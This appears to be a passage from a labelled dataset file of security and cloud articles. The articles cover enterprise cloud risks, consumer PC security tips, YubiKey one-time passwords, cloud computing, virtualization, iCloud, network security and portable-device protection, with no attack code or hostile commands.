cloud service provider.\n3. Data Protection and Confidentiality: Data stored, processed or indexed in a remote cloud service defines the extent of the new perimeter for the Enterprise. This new “fuzzy” boundary changes and moves with the data itself, not the traditional firewall. A necessary complication here is that for data to be used effectively by cloud services it must remain unencrypted or else SaaS providers will have a hard time indexing it for any function that relies on search. Common examples include spell-checking in a Google document or looking up sales leads in a CRM application. The Enterprise may have to give up encryption and data privacy requirements for some of its data but should also recognize the option of applying selective field or message level protection mechanisms for data before it reaches the cloud. A practical example of this is protecting employee or critical customer information on messages before the data is released to the cloud. This is one aspect of data protection that an Enterprise can control on data before it reaches the cloud service provider.\n4. Data Loss and Reliability: When critical business data is moved to a cloud service, there is some inherent risk of data loss. Even if cloud service vendors offer multiple back-ups and data redundancy, there is no perfect way to protect against the failure of physical media and disasters are apt to strike at just the wrong time. To take an example, services such as Amazon’s storage service offer “credits” in the face of data unavailability4 within a given month. This SLA may be too weak a proposition for business critical data and Enterprises may need more protection to manage this risk. Data loss and unavailability at precisely the wrong time may completely cripple an Enterprise. It may be argued that this is a false risk because the Enterprise has a similar risk of catastrophic data loss inside its own datacenter and simply moving the data to the cloud doesn’t change the equation. This claim ignores the fact that the cloud service provider is offering the same product at a much cheaper price and the reliability that the Enterprise has built around its data may simply not be present with the cloud service provider. It should be noted that this risk may turn out to be a red herring. The convenience and cost savings of the cloud service and record of actual failures may reduce this potential risk to near-zero, but it is too early to tell.\n5. Audit and Monitoring: The first step in managing the security of any system to know when specific risky events occur. If an Enterprise decides that cloud services provide value to the Enterprise but wants to audit when these services are accessed to evaluate risk, it needs a way to know when data flows to and from the cloud. Enterprises need to know who is making the service request, when the request is happening, how much data is sent or received and how the data is used. Given the convenience and ease with which cloud service providers can be accessed the biggest risk to an Enterprise concerns the use of unmanaged “rogue” cloud services or projects that go unnoticed or unmanaged by the Enterprise CSO.\n6. Cloud Provider Insider Threats: A potential problem or weak spot with cloud services is the mismatch between the security requirements inside the Enterprise as compared to those employed by the cloud service provider. To take an example, many large Enterprises make special efforts to secure “endpoint” data on IT-issues laptops with two-factor authentication technology, forced password rotation and fully encrypted hard-disk drives. Moreover, data is often segmented with access controls that distinguish between full employees and contractors, especially in large companies with diverse geographies. In most cases these controls increase the security of the Enterprise data. It should be noted that has taken Enterprises many years to reach this level of increased protection. Once the data is moved from protected assets to the cloud, however, an instant “weak spot” is created. Security breaches are often breaches of the weakest link, and a determined attacker motivated either by financial gain or industrial espionage will likely find it easier to execute an insider threat from the cloud service provider to gain access to the Enterprise data rather than try to execute a brute force attack on an encrypted hard disk. It should be noted that this is not the same as “hacking into Amazon’s API” or “hacking Google documents.” Sophisticated attackers use social engineering techniques and insider connections to find the weakest link. A motivated attacker may even take a low level job at the cloud provider itself if it provides an easier path to the Enterprise data.\n7. Account Hacking, Tiered Access Control and Authorization: While hacking an account through a stolen password or compromised credential is nothing new, Enterprises to date have done a decent job of segmenting credentials and access control throughout their infrastructure. This is actually a property or benefit of the somewhat localized security inherent in individual operating systems and the uses of role based (RBAC) and attribute based access control (ABAC) within the Enterprise. In other words, if an attacker gains root access to a networked system or database they may have access to other assets, but the breach of a single system is more often than not directly localized to the breached system. Further, breaches of a single account are self-limiting by the role or attributes associated with that account in the Enterprise LDAP system. It is true that sophisticated attackers can use information from any compromised system as a stepping stone for more sophisticated attacks, but more work is required by the attacker unless they are extremely lucky in breaching the exact system they need. If we contrast this to cloud service providers, a few such as Salesforce.com have rudimentary segmented access control and privileges5, but for the majority of these a breach of one account may grant the keys to the entire castle. In fact, the pay-off for an attacker who knows that he must hack just one account to gain access to all of the Enterprises resources may seek to employ cheap, readily available cloud computing resources for brute force attacks on passwords and cryptographic keys. Moreover, fine-grained authorization of Enterprise resources is a problem just now being solved inside the Enterprise and it will be some time before cloud providers reach the same sophistication of locking down the use of individual data elements, fields, URIs, resources or API calls to individuals with a specific role or specific attributes. Account hacking from an Enterprise insider also needs to be considered. Once the Enterprise moves to cloud computing traditional insider attacks can be more costly because the Enterprise must rely on the cloud provider to help prevent the insider breach. In short, not only are the keys to the castle held in the cloud, but the Enterprise has to protect its traditional assets and now cloud assets from insider attacks.\nThe previous seven risks are summarized in Table 1. Here we list the risks, a description of the threat and which party (Enterprise or Cloud Provider) is on the hook for reducing the threat. Ultimately, shoring up security risks is the job of both the Enterprise and the cloud providers. Short of a boycott, however, Enterprises have little real control over how security is implemented on the provider side. Cloud providers have yet to segment their offerings to provide increased levels of security targeted for Enterprise requirements such as higher levels of risk protection, integration with Enterprise identity systems, guarantees around multi-tenancy platform sharing (or isolation) and integration with monitoring, alerting and security event management systems. Instead, providers appear to be implementing minimum levels of security for their perceived target market. Whether this minimum security will rise as the industry matures is an open question, but for Enterprises that need to reduce risk while cautiously adopting cloud services we advocate the use of a high performance edge-oriented service gateway for those categories of risk that the Enterprise can control. This provides the necessary balance between the cost savings promised by cloud computing and the management of tangible risks that are under the Enterprise control. The next section outlines the concept of a service gateway and how it can reduce risk in four areas: (a) API protection and strong authentication, (b) Data protection and leakage, (c) Auditing and Monitoring, (d) Access Control and Authorization.", "label": 1}
{"text": "Security and Performance Issues\nThe dangers of computer viruses are often discussed, but you may not be aware of\nother hazards that can jeopardize your privacy, damage your files, and cause frustrating\nFortunately, implementing some simple strategies can not only secure your computer\nand keep your data safe, but can make your computer work faster and more efficiently.\n- Reviews the risks for a computer with excessive clutter, speed and performance\ndrains, insufficient security protection, and corrupted settings.\n- Suggests repairs and preventative measures that can both protect your computer\nand improve its speed, stability, and efficiency.\n- Provides definitions of key computer and security terms.\nSecurity and Performance Terms Defined\nRisks posed by unneeded files\nEvery time you work on your computer or browse the Internet, temporary files, cache\nfiles, and cookies are saved to your hard drive. Most of these are files that you\nwill never use and do not need to save. More unneeded buildup occurs from deleted\nfiles accumulating in the Recycle Bin. All this debris clutters your computer and\novertaxes its resources.\n- Reduction in processing. Unneeded files consume memory and take up drive\nspace. Instead of focusing on processing the services you really need, your computer\nis using resources to process useless items.\n- Recurrent crashes and lock-ups. A glut of unnecessary files increases drive\nfragmentation, which burdens the hard drive. With an excessive amount of debris,\nWindows can start to behave in unusual ways, including locking up or crashing.\n- Endangered privacy. Anyone who has access to your computer can see the\nWeb sites you have visited and easily open files you have deleted.\n- Erase temporary files. Simply deleting files from your Web browser cache\nor temporary directories does not completely erase these tracks. Most security advisers\nrecommend using software that can thoroughly clean out cookies, temporary Internet\nfiles, and cache files.\n- Empty the Recycle Bin. Windows stores deleted items in the Recycle Bin\nfor easy recovery, and as you work on your computer, these deleted files quickly\naccumulate. Periodically empty the Recycle Bin to reclaim valuable hard drive space.\nNote: Items left in the Recycle Bin also pose a privacy risk because these files\ncan be easily retrieved. Where confidentiality is critical, not only empty the Recycle\nBin, but also use a data wiping program to thoroughly obliterate data.\n- Remove unneeded files and programs. Occasionally review the data you have\nsaved and installed. Delete the documents and files you no longer want and uninstall\nprograms you are no longer using. Consider archiving rarely used files to a CD or\nother removable media.\nRisks posed by speed and performance drains\nVarious inefficiencies can bring your computer’s processing to a crawl, including\nfragmented hard drives, splintered system memory, scattered registry entries, and\nunneeded programs starting with Windows.\n- Slow boot times. Various programs and services are set to load when Windows\nloads. Some of these programs, such as antivirus protection, are desired, but many\nare useless and needlessly slowing the time it takes to start your computer.\n- Reduction in processing. When hard drives and system memory become fragmented,\ncomputer performance is significantly slowed. Files take longer to open and programs\ntake longer to start.\n- System and file damage. Highly fragmented files are more prone to becoming\ncorrupt. A highly fragmented hard drive places more strain on the heads, which in\nsevere cases can lead to a head crash and a loss of data.\n- Exposure to infections. Trojans (malicious software) might also be loading\nat startup. Trojans are usually designed to load when you restart your computer.\n- Defragment your hard drive and system memory. Defragmenting your hard drives\nreorganizes scattered data, which boosts file access speed and extends the life\nof the drive. Defragmenting system memory reclaims valuable memory and improves\nPC efficiency and speed.\n- Compact the registry. Compacting the registry reorganizes entries, which\nmaximizes free space and improves the efficiency and speed of registry processing.\n- Remove unneeded services from startup. Eliminate startup items that are\nunnecessary. Removing these unneeded performance drains will boost your PC’s speed,\nparticularly the time it takes to boot, and will eliminate potentially dangerous\nRisks posed by malicious software\nComputer viruses, hackers, and other Internet dangers continue to pose a high risk.\nA range of malicious programs (viruses, worms, Trojans, etc.) are designed to damage\ncomputers or obtain confidential information from them. These infections can wreak\nhavoc by causing permanent computer damage, destroying data, and enabling identity\n- Reduction in processing. Infections can cripple a system and bring processing\nto a halt. Viruses can make dangerous changes to the vital registry, causing system\nslowdowns and crashes.\n- Lost files. Your files – treasured photos, valuable music, important financial\nrecords – can all be destroyed if your computer becomes infected.\n- System and file damage. Viruses are designed to alter the operation of\na computer. In addition to damaging files, viruses can harm your registry, your\noperating system, and even your hardware.\n- Data and identity theft. Trojans can enable the theft of any data saved\non your computer, including banking and credit card information, passwords, address\nbooks, and other private information.\n- Financial risk. The monetary cost of recovering from data loss or identity\ntheft can be devastating.\n- Spreading of infections to others. You can unknowingly spread viral infections\nto your friends, family, and business associates just by sending an email or leaving\nyour computer unattended. Hackers can secretly take control of your PC and use it\nto attack and infect other computers.\n- Use a firewall. A firewall is vital to secure Internet activity. A firewall\nputs up a barrier against hackers and other intruders, but allows the Internet access\nthat you do want. Configure the firewall so that only the programs and Web sites\nyou trust are allowed to pass through.\n- Use antivirus software. Antivirus software is a must-have for anyone who\nuses the Internet. This software blocks computer infections and detects and removes\nany existing infections. Make sure you keep the virus signatures up to date for\n- Patch known security flaws. Many malicious programs exploit known security\nvulnerabilities in operating systems and browsers. Install the latest security patches,\nor use a specialized program that can automatically repair these flaws.\n- Only download trusted programs. Only download programs from trusted Web\nsites or refer to a trusted source for information. Do not install software if you\nare not sure about it.\n- Back up important files, including the registry. Establish and follow a\nschedule for regular backups of your data. Ideally, use a backup program that backs\nup all files, including programs and hidden operating system files. Regular backups\nof the registry are also recommended to protect its critical settings.\n- Permanently erase deleted confidential data. A file deleted through Windows\nis not completely erased; even though you can't see the file, someone using easily\navailable tools can recover it and view its contents. For highly confidential data\nyou have deleted, use data wiping software that completely erases all data remnants.\nRisks posed by corrupted settings\nOver time and with regular usage, a computer can slowly degrade and become unstable,\nwith frequent crashes, perplexing error messages, and a host of other unexpected\nnuisances. Some defects that can crop up over time are invalid registry references,\nbroken shortcuts, hidden spyware, obsolete uninstallation files, and physical errors\non the hard drive and other devices.\n- Reduction in processing. Unneeded uninstallers and other invalid data in\nthe registry overburden Windows processing. Spyware wastes system memory and can\nslow or stop Internet processing and lead to overall sluggish performance.\n- Recurrent crashes and lock-ups. Damaged hard drives, spyware parasites,\nobsolete shortcuts, and inaccurate registry references frequently cause computer\ncrashes and lock-ups. A volatile computer is extremely frustrating and can become\n- Exposure to infections. In addition to burdening system memory, spyware\nhas been used to deliver Trojans and viruses. Any program designed to install on\na computer without the user’s knowledge carries a potential security risk.\n- System and file damage. Damaged sectors on a drive can prevent files from\nbeing accessed or saved and can cause system crashes. Spyware often incorporates\npoorly or carelessly designed functions that can harm your computer’s operating\nsystem and cause conflicts with your valid software.\n- Use spyware removal software. Spyware is created with covert techniques\nthat make it difficult for people to spot. The safest approach is to use software\nthat scans for and deletes spyware. Note: Do your research when dealing with unknown\nvendors. Some spyware removers advertised as “free” are actually spyware themselves,\nor contain Trojans and viruses.\n- Repair hard drive errors. A damaged hard drive can prevent you from saving\nfiles and retrieving existing files. Using software to fix hard drive errors protects\nyour data and improves PC stability.\n- Repair registry errors. The registry is vital to your computer's ability\nto run correctly and when it becomes corrupted, overall degraded performance occurs.\nMost technical advisors recommend that specialized software be used to make registry\nchanges, rather than making manual changes.\n- Be cautious of so-called “free” programs. Free programs, such as file-sharing\nsoftware, screen savers, and games, are regularly bundled with spyware. Disclosure\nof spyware is often hidden in the fine print of a license agreement. Be sure you\nunderstand what is packaged with a program before you download it.\nAdware is software that generates advertisements, usually as banner ads or pop-up\nwindows. Adware is usually bundled with other software and installed without your\nknowledge. While usually not physically damaging or outright malicious, the intrusive\nbehavior of adware can be annoying and waste system resources.\nCache files are used to store information on a temporary basis for quick access.\nA common example of a cache file is a browser cache. Every time you open a Web page,\nyour browser creates a cache file (a temporary copy) of the page's text and graphics.\nWhen you open the page again, your browser checks the Web site server for changes.\nIf the page hasn't changed, your browser loads the page from cache on your hard\ndrive, which is much faster than originally loading it from the remote server.\nA cookie is a small text file that some Web sites save to your local, hard drive\nwhile you are browsing the site. Cookies contain identifying information, such as\nlog in and shopping cart information. Cookies are useful for loading Web site preferences\nand login settings, but they can also contain information that can be passed to\nothers without your knowledge, usually for advertising purposes.\nOver time, as you create, delete, and download files, your computer cannot store\ndata as one unit and instead will split it up and store pieces in various drive\nlocations. A fragmented hard drive has a large amount of such scattered data and\ncan significantly slow PC performance. Similar to hard drives and other storage\nmedia, system memory can also become fragmented with time and usage.\nDefragmenting reorganizes data so that components are stored closer to each\nother. Regularly defragmenting hard drives and system memory improves drive speed,\nreclaims valuable memory, and extends the life of your computer.\nMalware (MALicious softWARE) is a generic term covering a range of software programs\nthat are designed to damage computers or to obtain unauthorized information from\ncomputers. Some specific types of malware include viruses, worms, and Trojans.\nThe registry is a database that holds configuration settings used by your Windows\noperating system. The registry is vital to your computer’s ability to run correctly.\nIt stores key data that Windows requires and continually references, such as user\nprofiles and settings for installed software and hardware.\nOnly manually edit the registry if you know what you are doing; making inaccurate\nmodifications can severely damage your computer. Always back up the registry prior\nto making any changes.\nSpyware is tracking software that is installed on your computer without your notice\nor consent. It sends information about your computing activities back to its source,\nusually for advertising purposes, but sometimes for much more dangerous purposes\nsuch as identity theft or credit card fraud.\nThe effect of spyware varies depending on what its creator’s intentions are and\ncan include consumption of valuable system resources, random lockups, crashes, or\nslowdowns; Web browser Home page or search page redirection; unwanted software installation;\nand random or incessant pop-up ads.\nA Trojan, or Trojan horse, is a software program that appears to be desirable or\nuseful, but intentionally does something you do not expect. The effects of Trojans\ncan range from simply displaying pop-up ads to destroying files or enabling the\ntheft of data.\nTrojans are distributed in executable files, such as through email attachments,\nCDs, and Internet downloads. People can be lured into installing a Trojan because\nit appears that it will serve a legitimate purpose. Unlike viruses and worms, a\nTrojan is not designed to make automatic copies of itself. However, Trojans can\ncarry viruses and other malicious software within them.\nTwo specific types of Trojans are keyloggers and RATs:\n- A keylogger, or keystroke logger, captures all keystrokes and then records that\ninformation to a log file. With a keylogger, a hacker can capture your logins, passwords,\ncredit card numbers, and any other confidential information that you type. Once\ncollected, this information can be silently transmitted to the Trojan’s creator\nfor malicious purposes, such as credit card or bank fraud.\n- A remote access Trojan (RAT) gives someone remote access to and control of a computer.\nWith a RAT, imposters can send email messages that will appear to be from you; read,\nmodify, or destroy your documents; and use your PC to attack and infect other computers.\nA computer virus is a software program designed to alter the operation of a computer.\nMost viruses are malicious and intended to cause damage, but even a benign virus\ncan harm a system. Viruses can damage files, software programs, the registry, and\nViruses are distributed in executable files, such as through email attachments,\nCDs, and Internet downloads. A virus infection occurs when the infected file is\nrun. A virus also automatically replicates, or makes copies of itself, by secretly\nembedding its programming code into other programs.\nThe term “virus” is often used as a generic, collective reference that includes\nother types of malicious programs, such as worms and Trojans.\nA computer worm is a software program designed to reproduce and spread among computers.\nMost worms are malicious and intended to overwhelm system memory or network bandwidth.\nWorms can crash an entire network of computers or an individual computer.\nWorms are generally distributed in email attachments or through unprotected Internet\nactivity. A worm spreads very rapidly because it is self-contained. It replicates\nitself and, unlike viruses, a worm does not need to infect another program to spread.", "label": 1}
{"text": "There are some explanations on what YubiKey does here. Basically, the password which the YubiKey \"types\" (from the point of view of the computer, it is a keyboard) can be either a static password, or a one-time password. If it is a static password, then you just revealed it, and it is time to be very sorry (and promptly change that password).\nThe one-time passwords, what YubiKey produces follows HOTP. The cryptography in HOTP is such that it is not computationally feasible to recompute the \"master secret\" from one or several one-time passwords produced with HOTP. Moreover, each password is internally computed from a counter. The YubiKey and the server both maintain the same counter, and the server allows for some limited lack of synchronization. Namely, when the server's current counter has value n and receives a password as authentication attempt, it will internally generate the passwords for values n+1, n+2,... up to, say, n+100 (that's configurable). If a match is found with (say) password n+17, then access is granted and the server's counter is set to n+17; otherwise, connection is rejected and the server's counter is not changed.\nTherefore, what you inadvertently published \"on the Internet\" is a password which will grant access to the corresponding server, until your own next authentication on that server, because that authentication will update the server's counter to a further counter value. In a way, using OTP with counter value k invalidates all OTP values with values j < k. Which leads to the following recovery procedure: if you published an OTP value, quickly connect to the server so as to invalidate that published value. Afterwards, you can just ignore it; once invalidated, it is harmless.\n(Note: if you repeatedly generate a lot of \"blank\" passwords with your key without authenticating to the server, your YubiKey may go out of synch with that of the server -- the key using counter values way beyond what the server would currently accept. Don't let your 3-year-old play with your YubiKey ! In a similar situation, for infrared car keys, counter synchronization is forced through RFID when you start the engine.)", "label": 1}
{"text": "The cloud computing revolution is real: it’s on the front page of the Australian Financial Review this morning. But is it really “a radical new business model that purports to slash technology costs by up to 80%”?\nWhat is cloud computing?\nEvery business bigger than one person needs somewhere to store its data and run its business applications and communications, including email. A generation of businesses has installed a server — or many servers in a data centre — and hired specialist IT staff to run it.\nWith cloud computing, you instead rent capacity in a provider’s data centre, and connect over the internet. The provider’s staff install, maintain and upgrade hardware and software as required. Typically you’ll rent a service, such as data storage or email or accounting, rather than ‘a server’ as such, and pay $X per user or $Y per business per month.\nWhy is it called cloud computing?\nNetwork diagrams have traditionally used a cloud symbol to denote ‘the internet’ or, before that, the telephone network outside the customer’s zone of responsibility.\nWhat services are on offer?\nYou name it. Google’s Gmail and Microsoft’s Windows Hotmail are email in the cloud. In the lucrative business productivity market, Google Docs and Google Apps compete directly with Microsoft Office and Exchange — the latter now ‘in the cloud’ as Microsoft Online Services.\nAccounting, customer relationship management (CRM), project management, email marketing, spam and virus filtering, data storage, ecommerce, online publishing, audio and video streaming, general databases — all available in the cloud.\nWhy use cloud computing?\nPotentially cloud services are cheaper and more flexible. Because they’re internet-based, you can access them from anywhere — often including mobile devices.\nMost servers and internet links lie idle most of the time. Cloud providers host many businesses on a pool of hardware, sharing the cost of servers, electricity, data links, backup systems, IT staff and even real estate. A cloud provider can quickly add extra capacity or scale it back again when you need it. Capital expenditure on servers and up-front software licenses, and the unpredictable costs of dealing with emergencies, are replaced by a predictable operational cost.\nCan it really cut IT costs by 80%?\nThat’s hype. Hardware and internet costs are dropping, sure, but supporting end users is still a significant cost. Moving to the cloud removes the cost of maintaining your own systems, but you still need to configure the generic cloud-based service to match your business’ unique needs, train your staff and help them find lost spreadsheets.\nIs there a downside?\nYou become dependent on your cloud providers. If there’s no easy way to extract your data in a usable format, your business success is now intertwined with theirs. There may also be legal and privacy issues: will your data become subject to the privacy and data retention laws of another country; will you still be compliant with your industry requirements in Australia?\nIs it secure?\nBig cloud providers like Microsoft and Google have some of the best security staff on the planet. Their backup procedures are likely to be better than yours too. (Where are your business data backups right now?) However big cloud providers do represent an attractive target to hackers — if they can break in.\nIs cloud computing “radically new”?\nNot everyone thinks it’s that big a change. It’s more evolution than revolution. “Cloud computing is not only the future of computing, it is the present, and the entire past of computing is all cloud,” said Larry Ellison, founder of Oracle Corporation and the world’s sixth richest man, in a passionately entertaining rant last year. “It’s not water vapour. All it is is a computer attached to a network. What are you talking about? I mean, what do you think Google runs on?” As Ellison points out, CRM provider Salesforce.com has been running more than a decade.\nIn many ways cloud computing is indeed just the current buzzword for what has also been called utility computing, grid computing, software as a service (SaaS), IBM’s ‘On Demand’ branded services, the application service provider (ASP) model, or even good ol’ mainframe timesharing.\nWhere is Australia in all this?\nSome big companies have committed to cloud computing, including the Commonwealth Bank, Westpac, Visy and Komatsu. The Royal Australian College of General Practice will provide GPs with cloud-based e-health applications by this time next year. Even the Department of Defence’s CIO is advocating the cloud.\nOn the supply side, Telstra is investing heavily to become a player — they’re providing the RACGP’s services. Saasu and Campaign Monitor are Australian success stories in cloud-based accounting and email marketing respectively.\nCloud computing does require solid internet links, however. Australia’s relatively expensive broadband infrastructure may have held back adoption. The NBN will presumably fix this.", "label": 1}
{"text": "Virtualization, in computer science, is a virtual (or real) of something, such as hardware platform, operating system, storage device or network resources.\nVirtualization can be seen as part of the largely expansion of enterprise IT that includes autonomic computing, a scenario in which the IT environment can be managed on the basis of perceived activity, and utility computing, where you see the processing power of computers utility customers to pay only when necessary. The usual goal of virtualization is to centralize administrative tasks and improve the scalability and workload.\nVirtualization within IT is not a new phenomenon; in fact, it has been a way to reduce IT costs in the industry in one form or another for nearly 20 years. The main difference now is the wide range of virtualization technologies available and how these can be implemented to achieve differing business objectives.\nBecause virtualization can introduce flexibility to an IT estate and bring with it a wide range of benefits, IT organizations often lose focus on the benefits they are looking for and concentrate on delivering to those needs. No single item in an IT budget is going to have the procurement impact of the mainframe of yesteryear, and as such, far more work needs to be done to quantify the benefits\nVirtualization can increase the capacity of the data centre, reduce hardware support costs, bring electricity bills within digestible limits and even increase performance by removing aged architecture from your estate.\nThe creation and popularity of mobile devices in the market today has seen IT departments having to respond to user requests to connect everything from smart phones to tablets to their corporate environments.\nIt is easy for the users to use the application, but difficult to choose.\nVirtualization is further divided as desktop virtualization and server virtualization.\nServer virtualization is the partitioning of a physical server into smaller virtual servers. In server virtualization the resources of the server itself are hidden, or masked, from users, and software is used to divide the physical server into multiple virtual environments, called virtual or private servers.\nServer virtualization has many benefits. For example, it lets each virtual server run its own operating system and each virtual server can also be autonomously, separately rebooted of one another. Server virtualization also reduces costs because less hardware is required so that alone saves business money. It also utilizes resources to the fullest so it can also save on operational costs (e.g. using a lower number of physical servers reduces hardware maintenance).\nDesktop virtualization – Many enterprise-level implementations of technology store the resultant “virtualized” desktop on a remote central server, instead of on the local storage of a remote client; thus, when users work from their local machine, all of the programs, applications, processes, and data used are kept on the server and run centrally. Desktop virtualization allows users to run operating system and execute applications from a Smartphone or a thin client which exceed the user hardware’s capability to run.Pin It", "label": 1}
{"text": "About Incorporating iCloud Into Your App\niCloud is a free service that lets users access their personal content on all their devices—wirelessly and automatically via Apple ID. iCloud does this by combining network-based storage with dedicated APIs, supported by full integration with the operating system. Apple provides server infrastructure, backup, and user accounts, so you can focus on building great iCloud-enabled apps.\nThe core idea behind iCloud is to eliminate explicit synchronization between devices. A user never needs to think about syncing and your app never interacts directly with iCloud servers. When you adopt iCloud storage APIs as described in this document, changes appear automatically on all the devices attached to an iCloud account. Your users get safe, consistent, and transparent access to their personal content everywhere.\nAt a Glance\niCloud is all about content, so your integration effort focuses on the model layer of your app. Because instances of your app running on a user’s other devices can change the local app instance’s data model, you design your app to handle such changes. You might also need to modify the user interface for presenting iCloud-based files and information.\nThere is one important case for which Cocoa adopts iCloud for you. A document-based app for OS X v10.8 or later requires very little iCloud adoption work, thanks to the capabilities of the\nThere are many different ways you can use iCloud storage, and a variety of technologies available to access it. This document introduces all the iCloud storage APIs and offers guidance in how to design your app in the context of iCloud.\niCloud Supports User Workflows\nAdopting iCloud in your app lets your users begin a workflow on one device and finish it on another.\nSay you provide a podcast app. A commuter subscribes to a podcast on his iPhone and listens to the first twenty minutes on his way to work. At the office, he launches your app on his iPad. The episode automatically downloads and the play head advances to the point he was listening to.\nOr say you provide a drawing app for iOS and OS X. In the morning, an architect creates some sketches on her iPad while visiting a client. On returning to her studio, she launches your app on her iMac. All the new sketches are already there, waiting to be opened and worked on.\nTo store state information for the podcast app in iCloud, you’d use iCloud key-value storage. To store the architectural drawings in iCloud, you’d use iCloud document storage.\nThree Kinds of iCloud Storage\niCloud supports three kinds of storage. To pick the right one (or combination) for your app, make sure you understand the intent and capabilities of each. The three kinds of iCloud storage are:\nKey-value storage for discrete values, such as preferences, settings, and simple app state.\nDocument storage for user-visible file-based information such as word processing documents, drawings, and complex app state.\nCore Data storage for shoebox-style apps and server-based, multi-device database solutions for structured content. iCloud Core Data storage is built on document storage and employs the same iCloud APIs.\nPrepare for iCloud with Provisioning and Entitlements\nThe first two steps in adopting iCloud for your app are to obtain an appropriate provisioning profile for your development device and to request the appropriate entitlements in your Xcode project.\nEntitlements are key-value pairs that request capabilities for your app—such as the capability to use iCloud. Your iCloud entitlement values define where your app can place data and they ensure that only your apps are allowed to access that data. You request separate entitlements for document storage and key-value storage. When you code sign your app, these requests become part of your app’s code signature.\nHow to Use This Document\nWhether you are developing for iOS, OS X, or both, and no matter which sort of app you are developing, start by reading the entire “iCloud Fundamentals” chapter to get the foundation that all iCloud developers need.\nNext, read “Designing for Key-Value Data in iCloud.” Any app that provides user settings or maintains user state—that is, nearly every app—should adopt iCloud key-value storage.\nThe iOS and OS X document architectures automatically provide most of the iCloud functionality needed by document-based apps. If your app works with file-based information, you’ll want to read “Designing for Documents in iCloud.”\nIf you are developing a Core Data app, read “Designing for Core Data in iCloud” for an overview of iCloud considerations for Core Data.\nNo matter which iCloud storage APIs you adopt in your app, testing is critical. To get started on creating a test plan for your app, read “Testing and Debugging Your iCloud App.”\nThis document describes the pieces you need to support iCloud in your app, but does not teach you how to develop apps. For that, start with Start Developing iOS Apps Today or Start Developing Mac Apps Today, and read the following documents:\niOS apps: iOS App Programming Guide\nMac apps: Mac App Programming Guide\nFor a tutorial introduction to implementing a document-based iCloud app for iOS, read Your Third iOS App: iCloud.\n© 2012 Apple Inc. All Rights Reserved. (Last updated: 2012-09-19)", "label": 1}
{"text": "As we continue this journey into the age of big data, cloud, mobility, social media and so forth, vast amounts of data are being generated daily. The volume of digital information continues to grow with no end in sight. More and more, personal and company information are becoming more and more digitized, both in storage and transfer. Securing this information is a growing challenge, and is becoming more complex by the day. Protecting digital assets means utilizing the best of available technologies and methodologies to achieve security goals. Not only must they ensure that the quality and performance of the solution is maintained, they must also assure undoubtedly that the information they seek to protect stays uncompromised.\nIn the worlds of business and government, troves of information exist that are the focus of network security protection. Among the many different types, the data in question could be financial, medical, legal information, business intellectual property, and customer information. The vulnerability points could be numerous, and present points of weakness that emanate from such common elements such as a wi-fi network, dial-up, DMZ, Web Servers, VPN, USB drives – just to name a few. Organizations must therefore ensure they are monitoring all parts of their networks, and ensure they are using the best of security solutions that are deployed properly. Among the many things to consider are abilities such as administrator notification in the event of a breach and any related actions thereafter.\nNetwork monitoring manifests itself as a sustained operation, examining components of the network for information, failure, or performance. In the event of a failure, a notification is commonly configured. Depending on the environment this could range from alerting a system administrator, to logging an event in a knowledge base. Knowledge can be gleaned from a robust and well-integrated system by constantly analyzing performance, server outages, and any behavior that is out of the norm and varies from a baseline.\nSecuring a network focuses on the effects of external threats to the network. Many organizations are under the direct influence of regulatory concerns; many others are targeted for attack by criminal and nefarious parties. Still other organizations may hold and protect valuable consumer and client data. A breach of such information could be significantly damaging to the reputation of an organization. The argument for proper and effective security cannot be dismissed in case after case, after case.\nThere was a time when sophisticated network protection may have been an afterthought. Those days are long behind us. Take for example consumer focused services, copious amounts of information are increasingly put into cloud constructs, mobile technologies, across foreign networks, and many other elements that help complicate this picture. Customers expect their information is safe, secure, and free from prying eyes. Well publicized stories about identity theft, banking scams, and privacy have brought awareness to the general public. Though a brief example, when the concept is extended into confidential company information, or financial information, it is quite easy to extend the business-critical nature of network security into countless scenarios.\nA well-constructed network security system that is efficient in technical operation and accepted as a necessary policy are critical in today’s network and computing services. If you have not raised the criticality of security in your organization on par with other services your organization provides, then your organization could possibly face being quite behind in providing the best service possible and be on the wrong side of the risk. Accepting yesterday’s acceptable security in the ever-changing world of technology is a recipe for failure.", "label": 1}
{"text": "There are several good ways to physically protect the data on laptops, netbooks, smart phones, personal data assistants (PDAs), memory sticks and other portable devices. Because these devices are small and generally not secured, it makes them especially susceptible to theft. Even if the data is protected and/or encrypted, theft of a portable device is nonetheless inconvenient and frustrating. In a worst-case scenario, the exposure of private and sensitive data could lead to serious consequences for a CPA firm.\nPortable devices with wireless capabilities are vulnerable to a wide range of potential attacks. Many devices are stronger than others when it comes to security. For example, Research in Motion (RIM), the company behind the BlackBerry, has made significant strides when it comes to smart phones and PDAs.\nSecuring portable devices combines many different techniques. For example, you probably have one or more passwords that need to be entered before accessing data. Be smart and keep these in mind when using and creating passwords:\n- The Obvious — Create a strong password that you can easily remember and protect it from prying eyes.\n- Length and Complexity — Use at least 14 characters. The greater the variety of characters in your password, the better. Use the entire keyboard, not just the letters and characters you use or see most often.\n- Avoid — Dictionary words in any language; words spelled backwards, common misspellings and abbreviations; sequences or repeated characters; using personal information.\n- Test Your Password — Try www.microsoft.com/protect/fraud/passwords/checker.aspx. Microsoft offers some good guidance on creating strong passwords.\nStore Data in Different Places\nDon’t put all of your eggs in one basket. Never, ever allow your portable device to be the sole storage location of confidential or sensitive data. Consider storing data in separate locations. There are a number of storage mediums available that can be used for this purpose. External storage devices, like network area storage (NAS) boxes, are ideal. A reasonably sized NAS box can be purchased for under $200. In addition to storing data in different places, a NAS box works extremely well for frequent and timed backups of portable devices. This helps to guarantee availability of data if the portable device is lost or stolen.\nEncrypt Your Files\nEncryption helps ensure that unauthorized parties cannot access confidential and sensitive data, even if they have physical access to the portable device. Full disk encryption on laptops and netbooks is a must when such machines are used on engagements and may contain confidential and private client data. This technology prevents an intruder from starting a portable device without a password or biometric swipe.\nLaptops, netbooks and PDAs should receive the same level of security as your office desktop computer. Viruses are very common on the Internet and could potentially cause significant damage if your device is not protected. Take the protection one step further by implementing a solution that defends against other threats, such as malware.\nA firewall is an essential component in portable data protection. This mechanism monitors inbound and outbound traffic and also offers protection when you’re traveling. When using your laptop or netbook in a public space, you will frequently encounter various available networks. While some of them will enable you to securely access the Internet, others will appear to allow Internet access but covertly capture activity that may be passed through the connection. A firewall will help to detect the intrusion and automatically block these efforts.\nAsk yourself, “Is it really necessary that I transport this sensitive information?” If the answer is no, then don’t put the sensitive information on the portable device. In addition to the aforementioned measures, deploying and training your staff on portable-device-security best practices will also help protect confidential and private data.\nUnderstand how your portable device works. Read all of the instructions. New portable devices have more features, which means that you will have more of a learning curve to be able to understand and 